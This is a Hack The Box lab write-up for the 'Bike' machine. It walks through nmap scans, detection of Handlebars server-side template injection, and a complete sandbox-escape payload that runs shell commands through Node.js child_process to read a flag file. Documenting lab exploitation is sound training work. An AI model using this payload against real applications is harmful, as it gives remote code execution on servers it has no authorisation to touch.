# Bike --- Hack The Box Write-up

**Date:** March 17, 2026\
**Status:** Completed\
**Category:** Web / SSTI

------------------------------------------------------------------------

# Reconnaissance

The first step was to identify open ports and services on the target
machine.

## Full Port Scan

``` bash
nmap -p- -T5 -v <IP>
```

**Explanation**

-   `-p-` → Scan all **65535 ports**
-   `-T5` → Faster scan (aggressive timing)
-   `-v` → Verbose output

This scan is used to discover **all open ports** before running more
targeted enumeration.

------------------------------------------------------------------------

## Service Enumeration

After identifying open ports, a service scan was performed:

``` bash
nmap -sV -v <IP>
```

**Explanation**

-   `-sV` → Detect service versions
-   Helps identify the **software running on open ports**

From this scan, a **web service** was discovered.

------------------------------------------------------------------------

# Web Enumeration

Opening the website in a browser revealed a simple web application.

The next step was to test for common **web vulnerabilities**, including:

-   Template injection
-   Input reflection
-   Command injection

------------------------------------------------------------------------

# SSTI Discovery

A quick test payload was used:

``` handlebars
{{this}}
```

If the application uses a template engine such as **Handlebars**, this
payload may be interpreted by the server.

The response confirmed that **template expressions were being
processed**, indicating a **Server-Side Template Injection (SSTI)**
vulnerability.

------------------------------------------------------------------------

# Identifying the Template Engine

Based on the syntax (`{{ }}`), the backend appeared to use
**Handlebars.js**.

Handlebars normally restricts arbitrary code execution, but certain
**prototype manipulation tricks** can be used to bypass these
restrictions.

------------------------------------------------------------------------

# Exploiting SSTI

A payload from **HackTricks** was used to escape the template sandbox.

Reference:

SSTI Payloads → HackTricks\
https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/

Payload used:

``` handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('cat ../flag.txt').toString();"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

------------------------------------------------------------------------

# How the Payload Works

The payload abuses **Handlebars prototype access** to construct a
JavaScript function.

Key steps:

1.  Access the **Function constructor**
2.  Build a JavaScript function dynamically
3.  Execute system commands using Node.js

Specifically, this part performs command execution:

``` javascript
process.mainModule.require('child_process').execSync(...)
```

## Breakdown

  Component                      Purpose
  ------------------------------ -----------------------------------
  `process.mainModule.require`   Access Node.js modules
  `child_process`                Allows command execution
  `execSync()`                   Executes a shell command
  `.toString()`                  Converts output to printable text

------------------------------------------------------------------------

# Reading the Flag

The command executed was:

``` bash
cat ../flag.txt
```

This reads the flag file from the parent directory.

Because `execSync()` returns the command output, the flag is printed
directly in the HTTP response.

------------------------------------------------------------------------

# Key Takeaways

## 1. SSTI Can Lead to Remote Code Execution

If the template engine allows access to dangerous objects like:

-   `process`
-   `constructor`
-   `require`

it may be possible to escape the sandbox.

------------------------------------------------------------------------

## 2. Always Test Simple Payloads First

Examples:

``` handlebars
{{7*7}}
```

or

``` handlebars
{{this}}
```

These can quickly reveal SSTI vulnerabilities.

------------------------------------------------------------------------

## 3. Node.js Template Engines Can Be Risky

Template engines like:

-   Handlebars
-   Pug
-   EJS

can lead to **RCE if misconfigured**.

------------------------------------------------------------------------

# Final Result

Using the SSTI vulnerability, arbitrary system commands were executed,
allowing retrieval of the flag.

**Lab successfully solved.**
